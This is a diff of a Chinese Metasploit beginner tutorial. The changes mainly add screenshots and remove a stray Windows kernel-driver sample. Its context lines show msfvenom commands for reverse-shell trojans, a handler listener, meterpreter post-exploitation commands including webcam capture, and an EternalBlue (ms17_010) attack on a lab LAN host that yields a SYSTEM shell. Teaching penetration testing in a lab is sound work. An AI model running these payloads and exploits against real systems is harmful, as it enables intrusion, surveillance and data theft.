@@ -241,7 +241,6 @@ Use auxiliary/scanner/discovery/arp_sweep
 ```
 Use auxiliary/scanner/portscan/syn  
 ```  
-![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片39.png)
 ![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片40.png)  
 线程最好设置成10以上不然很慢！！！  
 + 相关服务扫描  
@@ -259,9 +258,9 @@ use exploit/windows/mysql/mysql_mof（利用数据库用户密码得到一个met
 use auxiliary/admin/mssql/mssql_exec（利用数据库密码得到cmd（高权限）的命令执行）
 ```  
 ### 3.4功能程序
-Metasploit框架v4之后提供的功能程序只有msfvenom和msf*scan了，这两个的基本功能和作用在前面的框架介绍中讲过，这里就只讲讲msfvenom，msf*scan因为涉及汇编，调试等基础，所以会在以后的msf高级用法中讲到。v4之前，攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式并进行各种类型的编码需要msfpayload、msfencode和msfvenom协助完成，所以v4之后将它们的功能集成在msfvenom中，所以msfvenom功能很强大！在基础教程中只讲讲用msfvenom生成简单木马，后面的编码等在进阶中会讲到。
+Metasploit框架v4之后提供的功能程序只有msfvenom和msf*scan了，这两个的基本功能和作用在前面的框架介绍中讲过，这里就只讲讲msfvenom，msf*scan因为涉及汇编，调试等基础，所以会在以后的msf高级用法中讲到。v4之前，攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式并进行各种类型的编码需要msfpayload、msfencode和msfvenom协助完成，所以v4之后将它们的功能集成在msfvenom中，所以msfvenom功能很强大！在基础教程中只讲讲用msfvenom生成简单木马，后面的编码等在进阶中会讲到。  
 **利用msfvenom生成简单木马**  
-```
+```  
 Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 Windows
@@ -302,7 +301,6 @@ set LPORT <LPORT value>
 set ExitOnSession false
 exploit 
 ```  
-
 **事例**  
 1. 生成exe木马：  
 打开cmd，输入:  
@@ -345,14 +343,15 @@ run
 ``` 
 然后在真实机访问：  
 ![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片44.png)
-![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片45.png)  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片45.png) 
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片46.png)  
 可以看出，连续访问两次会话都是意外关闭，这是没有设置exitonsession这个关键参数！！  
 3. 生成apk（安卓app）木马：  
 原理同上，我不一一列举，可以参见下文:  
 [手动安卓应用中注入msf后门](http://www.4hou.com/mobile/5794.html)  
 **简易木马的用途有限，就是自己有对方主机的掌控权，或者对方没有杀软，不然像这种级别的木马是百分之百会被查杀的！！！**
 ### 3.5后渗透阶段
-后渗透阶段即拿到目标主机反弹的shell后或者在对目标的渗透中离目标主机所在网络位置更进一步后所处的阶段。这个阶段很关键，涉及到对目标机密数据的窃取，和后门安置以及免杀等方面的操作，也是渗透测试中极为关键的一步，后文的进阶会有专门的专题讲解。在msf中，shell类型也就是payload的类型，Metasploit提供了很多payload，meterpreter算是高级payload了。既然是高级payload当然自有它的优势，meterpreter支持多平台，并且可扩展，纯内存的工作模式，而且支持流量加密，所以meterpreter是metasploit框架中必不可少的部分。
+后渗透阶段即拿到目标主机反弹的shell后或者在对目标的渗透中离目标主机所在网络位置更进一步后所处的阶段。这个阶段很关键，涉及到对目标机密数据的窃取，和后门安置以及免杀等方面的操作，也是渗透测试中极为关键的一步，后文的进阶会有专门的专题讲解。在msf中，shell类型也就是payload的类型，Metasploit提供了很多payload，meterpreter算是高级payload了。既然是高级payload当然自有它的优势，meterpreter支持多平台，并且可扩展，纯内存的工作模式，而且支持流量加密，所以meterpreter是metasploit框架中必不可少的部分。  
 ```
 ? – 帮助菜单
 background – 将当前会话移动到背景
@@ -433,622 +432,41 @@ webcam_stream-开始摄像监控
 ### 3.6实战练习
 上文介绍了metasploit大体的结构和简单的用法，现在我们利用所学的知识对一台有漏洞的主机进行测试攻击：
 任务：已知局域网中的几台主机都存在ms17010漏洞，请利用msf进行攻击！！
-首先用nmap对机房局域网进行了扫描(当然可以利用msf的辅助模块进行扫描的）：
-
-
-可以看出，开了445端口的主机都存在漏洞，现在对192.168.1.35这台主机进行攻击，当然局域网中的主机都存在漏洞是已知条件，如果不知道主机是否存在ms17010这个漏洞，需要先利用辅助模块中的的auxiliary/scanner/smb/smb_ms17_010来检验是否存在漏洞。此步先跳过。
+首先用nmap对机房局域网进行了扫描(当然可以利用msf的辅助模块进行扫描的）：  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片47.png) 
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片48.png) 
+可以看出，开了445端口的主机都存在漏洞，现在对192.168.1.35这台主机进行攻击，当然局域网中的主机都存在漏洞是已知条件，如果不知道主机是否存在ms17010这个漏洞，需要先利用辅助模块中的的auxiliary/scanner/smb/smb_ms17_010来检验是否存在漏洞。此步先跳过。  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片49.png)  
 比如我们现在要使用ms17010的exp，就搜索：
 Search cve：2017 type：exploit platform：windows
-结果如下图所示，找到了ms17010的对应模块：
-
-
-完整图在下面：
-
+结果如下图所示，找到了ms17010的对应模块：  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片50.png)  
+完整图在下面：  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片51.png)  
 利用ms17010对win7主机实施入侵：
 上面我们找到了ms17010的攻击模块，那就直接来用吧！
-命令：use exploit/windows/smb/ms17_010_eternalblue（命令输入时可按tab快速填充）
-
+命令：use exploit/windows/smb/ms17_010_eternalblue（命令输入时可按tab快速填充）  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片52.png) 
 现在已经进入了exploit攻击模块，先查看一下设置项：
-Show options
-
+Show options  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片53.png) 
 这里有一些参数不用管，只需要知道rhost填写目标ip地址就行。
-命令：set rhost 目标ip
-
-然后在输入命令：run或exploit就行啦！
-
+命令：set rhost 目标ip  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片54.png) 
+然后在输入命令：run或exploit就行啦！  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片55.png)  
 可以看到返回了目标机的cmd shell而且权限很高，因为这个攻击模块将dll链接文件注入到windows里面的spoolsv.exe进程，这是一个系统进程,所以得到的是系统权限。因为在刚才的参数设置是没有设置payload（攻击荷载），msf会默认一个shell，即bind_shell，但是bind_shell支持的命令有限，实现的功能有限，且不方便。所以，我们换meterpreter荷载来进一步攻击。
 用exit命令退出刚才的shell，在kali中直接ctrl+c结束，输入命令：
 set payload windows/x64/meterpreter/reverse_tcp
-（payload种类很多，最新版msf的payloads有500多个，可使用show  payload命令来查看，你可以根据不同系统而选择。我的电脑是64位的，所以我选择这个payload。）
-1.set lhost 本地ip地址
-2.set lport 本地监听地址（可不填，默认为4444）
-3.run（exploit）
-
+（payload种类很多，最新版msf的payloads有500多个，可使用show  payload命令来查看，你可以根据不同系统而选择。我的电脑是64位的，所以我选择这个payload。）  
+```
+set lhost 本地ip地址
+set lport 本地监听地址（可不填，默认为4444）
+run（exploit）
+```  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片56.png) 
 可以看出攻击成功，可以完全的控制目标主机了。
-在meterpreter会话中执行ifconfig查看目标主机ip：
+在meterpreter会话中执行ifconfig查看目标主机ip：  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片57.png) 
+这只是一次很简单的利用metasploit框架进行的渗透测试，算是基础中的基础了，掌握了这些才是踏过metasploit的初级门槛，真正的实际用法和高级用法以后会讲到。  
 
-
-这只是一次很简单的利用metasploit框架进行的渗透测试，算是基础中的基础了，掌握了这些才是踏过metasploit的初级门槛，真正的实际用法和高级用法以后会讲到。
-
-```  
-#include <ntddk.h>        //标准驱动头文件
-
-//设备名称 比如C盘对应的设备名：\Device\HarddiskVolume3
-#define DEVICE_NAME L"\\device\\ntmodeldrv"    
-
-//用户可见驱动名称 类似C盘
-#define LINK_NAME L"\\dosdevices\\ntmodeldrv"  
-#define IOCTRL_BASE 0x800          // 0x000-0x7FF被微软占用
-
-#define MYIOCTRL_CODE(i) \
-   CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_BUFFERED,FILE_ANY_ACCESS)
-
-#define CTL_HELLO MYIOCTRL_CODE(0)
-#define CTL_PRINT MYIOCTRL_CODE(1)
-#define CTL_BYE MYIOCTRL_CODE(2)
-
-NTSTATUS DispatchCommon(PDEVICE_OBJECT pObject, PIRP pIrp) //释放IRP
-{
-   pIrp->IoStatus.Status = STATUS_SUCCESS;                  
-   pIrp->IoStatus.Information = 0;      //返回R3，不再往下发，过滤驱动会继续下发
-
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);     //终止IRP
-
-   return STATUS_SUCCESS;            //返回IO管理器
-}
-
-NTSTATUS DispatchCreate(PDEVICE_OBJECT pObject, PIRP pIrp)  //打开文件
-{
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = 0;
-
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-}
-
-NTSTATUS DispatchRead(PDEVICE_OBJECT pObject, PIRP pIrp)  //读
-{
-   PVOID pReadBuffer = NULL;    //要读的buffer地址
-   ULONG uReadLength = 0;      //要读的buffer长度
-   PIO_STACK_LOCATION pStack = NULL;
-   ULONG uMin = 0;
-   ULONG uHelloStr = 0;
-
-   uHelloStr = (wcslen(L"hello world") + 1) * sizeof(WCHAR);  //* sizeof(WCHAR)等价于x2
-
-   //第一步，拿到缓存的地址和长度(irp分头和栈)
-   //从头部拿缓存地址
-   pReadBuffer = pIrp->AssociatedIrp.SystemBuffer;            //SystemBuffer(buffered io),MdlAddress(direct io),UserBuffer(neither io)
-   //从栈上拿缓存长度
-   pStack = IoGetCurrentIrpStackLocation(pIrp);
-   uReadLength = pStack->Parameters.Read.Length;   //Length为应用层缓冲区长度
-
-   //第二步：读，写等操作
-   uMin = uReadLength>uHelloStr ? uHelloStr : uReadLength;   //传最小的值(安全考虑)字符串的话字符串长度-1
-   RtlCopyMemory(pReadBuffer, L"hello world", uMin);         //内核中拷贝内存函数：RtlCopyMemory
-
-   //第三步，完成IRP
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = uMin;        //实际读的长度
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-
-}
-
-NTSTATUS DispatchWrite(PDEVICE_OBJECT pObject, PIRP pIrp)
-{
-   PVOID pWriteBuff = NULL;
-   ULONG uWriteLength = 0;
-   PIO_STACK_LOCATION pStack = NULL;
-
-   PVOID pBuffer = NULL;
-
-   pWriteBuff = pIrp->AssociatedIrp.SystemBuffer;
-
-   pStack = IoGetCurrentIrpStackLocation(pIrp);
-   uWriteLength = pStack->Parameters.Write.Length;
-
-   //分配内存,需要指定分页内存还是非分页内存,非分页内存级别要求高,TSET给内存打标签(4字节),低位优先
-   pBuffer = ExAllocatePoolWithTag(PagedPool, uWriteLength, 'TSET');  
-   if (pBuffer == NULL)
-   {
-      pIrp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; 
-      pIrp->IoStatus.Information = 0;
-      IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-      return STATUS_INSUFFICIENT_RESOURCES;
-   }
-
-   memset(pBuffer, 0, uWriteLength);
-
-   RtlCopyMemory(pBuffer, pWriteBuff, uWriteLength);
-
-   ExFreePool(pBuffer);      //释放
-   pBuffer = NULL;  
-
-
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = uWriteLength;
-
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-
-}
-
-NTSTATUS DispatchIoctrl(PDEVICE_OBJECT pObject, PIRP pIrp)
-{
-   ULONG uIoctrlCode = 0;
-   PVOID pInputBuff = NULL;
-   PVOID pOutputBuff = NULL;
-
-   ULONG uInputLength = 0;
-   ULONG uOutputLength = 0;
-   PIO_STACK_LOCATION pStack = NULL;
-
-   pInputBuff = pOutputBuff = pIrp->AssociatedIrp.SystemBuffer; 
-
-   pStack = IoGetCurrentIrpStackLocation(pIrp);
-   uInputLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
-   uOutputLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;
-
-
-   uIoctrlCode = pStack->Parameters.DeviceIoControl.IoControlCode;
-
-   switch (uIoctrlCode)
-   {
-   case CTL_HELLO:
-      DbgPrint("Hello iocontrol\n");
-      break;
-   case CTL_PRINT:
-      DbgPrint("%ws\n", pInputBuff);
-      //*(DWORD *)pOutputBuff =2;
-      break;
-   case CTL_BYE:
-      DbgPrint("Goodbye iocontrol\n");
-      break;
-   default:
-      DbgPrint("Unknown iocontrol\n");
-
-   }
-
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = 0;//sizeof(DWORD);
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-
-}
-
-NTSTATUS DispatchClean(PDEVICE_OBJECT pObject, PIRP pIrp)
-{
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = 0;
-
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-}
-
-NTSTATUS DispatchClose(PDEVICE_OBJECT pObject, PIRP pIrp)
-{
-   pIrp->IoStatus.Status = STATUS_SUCCESS;
-   pIrp->IoStatus.Information = 0;
-
-   IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
-   return STATUS_SUCCESS;
-}
-
-
-VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
-{
-   UNICODE_STRING uLinkName = { 0 };
-   RtlInitUnicodeString(&uLinkName, LINK_NAME);
-   IoDeleteSymbolicLink(&uLinkName);
-
-   IoDeleteDevice(pDriverObject->DeviceObject);
-
-   DbgPrint("Driver unloaded\n");
-
-}
-
-NTSTATUS DriverEntry                //程序入口
-(
-   PDRIVER_OBJECT pDriverObject,          
-   PUNICODE_STRING pRegPath      //pRegPath:注册表路径
-)
-{
-   UNICODE_STRING uDeviceName = { 0 };  //UNICODE_STRING内核中表示字符串的方法
-   UNICODE_STRING uLinkName = { 0 };
-   NTSTATUS ntStatus = 0;           //驱动中返回值0代表成功
-   PDEVICE_OBJECT pDeviceObject = NULL;
-   ULONG i = 0;
-
-   DbgPrint("Driver load begin\n");
-
-   RtlInitUnicodeString(&uDeviceName, DEVICE_NAME);  //将设备名的宏定义转化为UNICODE_STRING类型
-   RtlInitUnicodeString(&uLinkName, LINK_NAME);
-
-   //创建设备对象
-   ntStatus = IoCreateDevice  //IoCreateDevice定义在wdm.h中
-   (
-      pDriverObject,
-      0,                    //DeviceExtensionSize设备扩展长度
-      &uDeviceName, 
-      FILE_DEVICE_UNKNOWN,  //DeviceType设备类型
-      0,                      //DeviceCharacteristics设备特征
-      FALSE,    //Exclusive驱动对象是否独占，为了安全设为TRUE
-      &pDeviceObject          //传指针(指针的指针)
-   );                          //返回&pDeviceObject
-
-   if (!NT_SUCCESS(ntStatus))     //宏定义：#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-   {
-      DbgPrint("IoCreateDevice failed:%x", ntStatus);
-      return ntStatus;
-   }
-
-   //DO_BUFFERED_IO规定R3和R0之间read和write通信的方式：
-   //1,buffered io 缓存会拷贝一次，安全，但是效率低
-   //2,direct io 先映射到物理地址，然后R0和R3共用，效率高
-   //3,neither io  R3直接传到R0
-   //DO_DEVICE_INITIALIZING   防止初始化之前发送IO请求
-
-   pDeviceObject->Flags |= DO_BUFFERED_IO;     
-
-   //创建符号链接
-   ntStatus = IoCreateSymbolicLink(&uLinkName, &uDeviceName);
-   if (!NT_SUCCESS(ntStatus))       
-   {
-      DbgPrint("IoCreateSymbolicLink failed:%x\n", ntStatus);
-      IoDeleteDevice(pDeviceObject);       //如果创建失败，删除之前创建的设备对象
-      return ntStatus;
-   }
-
-   for (i = 0; i<IRP_MJ_MAXIMUM_FUNCTION + 1; i++)          //初始化分发函数
-   {
-      pDriverObject->MajorFunction[i] = DispatchCommon;
-   }
-
-   //初始化重要的分发函数
-   pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;    //打开文件
-   pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;  //读，数据从R0->R3
-   pDriverObject->MajorFunction[IRP_MJ_WRITE] = DispatchWrite; //写，数据从R3->R0
-   pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctrl; //关键函数，任何功能，可以实现所有功能
-   pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = DispatchClean;
-   pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
-
-   pDriverObject->DriverUnload = DriverUnload;            //卸载驱动
-
-   DbgPrint("Driver load ok!\n");
-
-   return STATUS_SUCCESS;
-}
-安装代码：
-#include <windows.h>  
-#include <winsvc.h>  
-#include <conio.h>  
-#include <stdio.h>
-#include <winioctl.h>
-
-#pragma warning(disable:4996)
-
-#define DRIVER_NAME "ntmodeldrv"
-#define DRIVER_PATH ".\\ntmodeldrv.sys"    //要加载的驱动路径
-
-#define IOCTRL_BASE 0x800
-
-#define MYIOCTRL_CODE(i) \
-   CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_BUFFERED,FILE_ANY_ACCESS)
-
-#define CTL_HELLO MYIOCTRL_CODE(0)
-#define CTL_PRINT MYIOCTRL_CODE(1)
-#define CTL_BYE MYIOCTRL_CODE(2)
-
-//装载NT驱动程序
-BOOL LoadDriver(char* lpszDriverName, char* lpszDriverPath)
-{
-   //char szDriverImagePath[256] = "D:\\DriverTest\\ntmodelDrv.sys";
-   char szDriverImagePath[256] = { 0 };
-   //得到完整的驱动路径
-   GetFullPathName(lpszDriverPath, 256, szDriverImagePath, NULL);
-
-   BOOL bRet = FALSE;
-
-   SC_HANDLE hServiceMgr = NULL;//SCM管理器的句柄
-   SC_HANDLE hServiceDDK = NULL;//NT驱动程序的服务句柄
-
-    //打开服务控制管理器
-   hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-
-   if (hServiceMgr == NULL)
-   {
-      //OpenSCManager失败
-      printf("OpenSCManager() Failed %d ! \n", GetLastError());
-      bRet = FALSE;
-      goto BeforeLeave;
-   }
-   else
-   {
-      ////OpenSCManager成功
-      printf("OpenSCManager() ok ! \n");
-   }
-
-   //创建驱动所对应的服务
-   hServiceDDK = CreateService(hServiceMgr,
-      lpszDriverName, //驱动程序的在注册表中的名字  
-      lpszDriverName, // 注册表驱动程序的 DisplayName 值  
-      SERVICE_ALL_ACCESS, // 加载驱动程序的访问权限  
-      SERVICE_KERNEL_DRIVER,// 表示加载的服务是驱动程序  
-      SERVICE_DEMAND_START, // 注册表驱动程序的 Start 值(3) 决定启动顺序
-      SERVICE_ERROR_IGNORE, //注册表驱动程序的 ErrorControl 值  
-      szDriverImagePath, // 注册表驱动程序的 ImagePath 值  errcode:2
-      NULL,  //GroupOrder 在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GroupOrderList处决定启动顺序
-      NULL,
-      NULL,
-      NULL,
-      NULL);
-
-   DWORD dwRtn;
-   //判断服务是否失败
-   if (hServiceDDK == NULL)
-   {
-      dwRtn = GetLastError();
-      if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
-      {
-         //由于其他原因创建服务失败
-         printf("CrateService() Failed %d ! \n", dwRtn);
-         bRet = FALSE;
-         goto BeforeLeave;
-      }
-      else
-      {
-         //服务创建失败，是由于服务已经创立过
-         printf("CrateService() Failed Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
-      }
-
-      // 驱动程序已经加载，只需要打开  
-      hServiceDDK = OpenService(hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS);
-      if (hServiceDDK == NULL)
-      {
-         //如果打开服务也失败，则意味错误
-         dwRtn = GetLastError();
-         printf("OpenService() Failed %d ! \n", dwRtn);
-         bRet = FALSE;
-         goto BeforeLeave;
-      }
-      else
-      {
-         printf("OpenService() ok ! \n");
-      }
-   }
-   else
-   {
-      printf("CrateService() ok ! \n");
-   }
-
-   //开启此项服务
-   bRet = StartService(hServiceDDK, NULL, NULL);
-   if (!bRet)
-   {
-      DWORD dwRtn = GetLastError();
-      if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
-      {
-         printf("StartService() Failed %d ! \n", dwRtn);
-         bRet = FALSE;
-         goto BeforeLeave;
-      }
-      else
-      {
-         if (dwRtn == ERROR_IO_PENDING)
-         {
-            //设备被挂住
-            printf("StartService() Failed ERROR_IO_PENDING ! \n");
-            bRet = FALSE;
-            goto BeforeLeave;
-         }
-         else
-         {
-            //服务已经开启
-            printf("StartService() Failed ERROR_SERVICE_ALREADY_RUNNING ! \n");
-            bRet = TRUE;
-            goto BeforeLeave;
-         }
-      }
-   }
-   bRet = TRUE;
-   //离开前关闭句柄
-BeforeLeave:
-   if (hServiceDDK)
-   {
-      CloseServiceHandle(hServiceDDK);
-   }
-   if (hServiceMgr)
-   {
-      CloseServiceHandle(hServiceMgr);
-   }
-   return bRet;
-}
-
-//卸载驱动程序  
-BOOL UnloadDriver(char * szSvrName)
-{
-   BOOL bRet = FALSE;
-   SC_HANDLE hServiceMgr = NULL;//SCM管理器的句柄
-   SC_HANDLE hServiceDDK = NULL;//NT驱动程序的服务句柄
-   SERVICE_STATUS SvrSta;
-   //打开SCM管理器
-   hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-   if (hServiceMgr == NULL)
-   {
-      //打开SCM管理器失败
-      printf("OpenSCManager() Failed %d ! \n", GetLastError());
-      bRet = FALSE;
-      goto BeforeLeave;
-   }
-   else
-   {
-      //打开SCM管理器失败成功
-      printf("OpenSCManager() ok ! \n");
-   }
-   //打开驱动所对应的服务
-   hServiceDDK = OpenService(hServiceMgr, szSvrName, SERVICE_ALL_ACCESS);
-
-   if (hServiceDDK == NULL)
-   {
-      //打开驱动所对应的服务失败
-      printf("OpenService() Failed %d ! \n", GetLastError());
-      bRet = FALSE;
-      goto BeforeLeave;
-   }
-   else
-   {
-      printf("OpenService() ok ! \n");
-   }
-   //停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。  
-   if (!ControlService(hServiceDDK, SERVICE_CONTROL_STOP, &SvrSta))
-   {
-      printf("ControlService() Failed %d !\n", GetLastError());
-   }
-   else
-   {
-      //打开驱动所对应的失败
-      printf("ControlService() ok !\n");
-   }
-
-
-   //动态卸载驱动程序。  
-
-   if (!DeleteService(hServiceDDK))
-   {
-      //卸载失败
-      printf("DeleteSrevice() Failed %d !\n", GetLastError());
-   }
-   else
-   {
-      //卸载成功
-      printf("DelServer:deleteSrevice() ok !\n");
-   }
-
-   bRet = TRUE;
-BeforeLeave:
-   //离开前关闭打开的句柄
-   if (hServiceDDK)
-   {
-      CloseServiceHandle(hServiceDDK);
-   }
-   if (hServiceMgr)
-   {
-      CloseServiceHandle(hServiceMgr);
-   }
-   return bRet;
-}
-
-void TestDriver()
-{
-   //测试驱动程序  
-   HANDLE hDevice = CreateFile("\\\\.\\ntmodeldrv",       //打开驱动链接,对应R0的DispatchCreate
-      GENERIC_WRITE | GENERIC_READ,
-      0,
-      NULL,
-      OPEN_EXISTING,
-      0,
-      NULL);
-   if (hDevice != INVALID_HANDLE_VALUE)
-   {
-      printf("Create Device ok ! \n");
-   }
-   else
-   {
-      printf("Create Device Failed %d ! \n", GetLastError());
-      return;
-   }
-   CHAR bufRead[1024] = { 0 };
-   WCHAR bufWrite[1024] = L"Hello, world";
-
-   DWORD dwRead = 0;
-   DWORD dwWrite = 0;
-
-   ReadFile(hDevice, bufRead, 1024, &dwRead, NULL);   //对应R0的DispatchRead
-   printf("Read done!:%ws\n", bufRead);
-   printf("Please press any key to write\n");
-   getch();
-   WriteFile(hDevice, bufWrite, (wcslen(bufWrite) + 1) * sizeof(WCHAR), &dwWrite, NULL);   //对应R0的DispatchWrite
-
-   printf("Write done!\n");
-
-   printf("Please press any key to deviceiocontrol\n");
-   getch();
-   CHAR bufInput[1024] = "Hello, world";
-   CHAR bufOutput[1024] = { 0 };
-   DWORD dwRet = 0;
-
-   WCHAR bufFileInput[1024] = L"c:\\docs\\hi.txt";
-
-   printf("Please press any key to send PRINT\n");
-   getch();
-   DeviceIoControl(hDevice,   //对应R0的DispatchIoctrl
-      CTL_PRINT,
-      bufFileInput,
-      sizeof(bufFileInput),
-      bufOutput,
-      sizeof(bufOutput),
-      &dwRet,
-      NULL);
-   printf("Please press any key to send HELLO\n");
-   getch();
-   DeviceIoControl(hDevice,
-      CTL_HELLO,
-      NULL,
-      0,
-      NULL,
-      0,
-      &dwRet,
-      NULL);
-   printf("Please press any key to send BYE\n");
-   getch();
-   DeviceIoControl(hDevice,
-      CTL_BYE,
-      NULL,
-      0,
-      NULL,
-      0,
-      &dwRet,
-      NULL);
-   printf("DeviceIoControl done!\n");
-   CloseHandle(hDevice);
-}
-
-int main(int argc, char* argv[])
-{
-   //加载驱动
-   BOOL bRet = LoadDriver(DRIVER_NAME, DRIVER_PATH);
-   if (!bRet)
-   {
-      printf("LoadNTDriver error\n");
-      return 0;
-   }
-   //加载成功
-
-   printf("press any key to create device!\n");
-   getch();
-
-   TestDriver();
-
-   //这时候你可以通过注册表，或其他查看符号连接的软件验证。
-   printf("press any key to stop service!\n");
-   getch();
-
-   //卸载驱动
-   bRet = UnloadDriver(DRIVER_NAME);
-   if (!bRet)
-   {
-      printf("UnloadNTDriver error\n");
-      return 0;
-   }
-
-
-   return 0;
-}  
-```  
